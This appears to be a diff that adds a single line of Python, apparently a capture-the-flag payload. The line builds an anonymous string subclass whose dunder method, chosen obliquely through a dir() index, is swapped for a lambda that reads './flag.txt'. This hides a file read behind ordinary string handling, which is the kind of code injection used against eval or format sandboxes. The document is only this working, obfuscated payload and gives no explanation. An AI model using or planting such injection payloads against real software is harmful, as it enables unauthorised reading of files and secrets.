@@ -1,0 +1,1 @@
+0,type('a',(str,),{dir(str)[27]:lambda*q:open("./flag.txt").read()})()
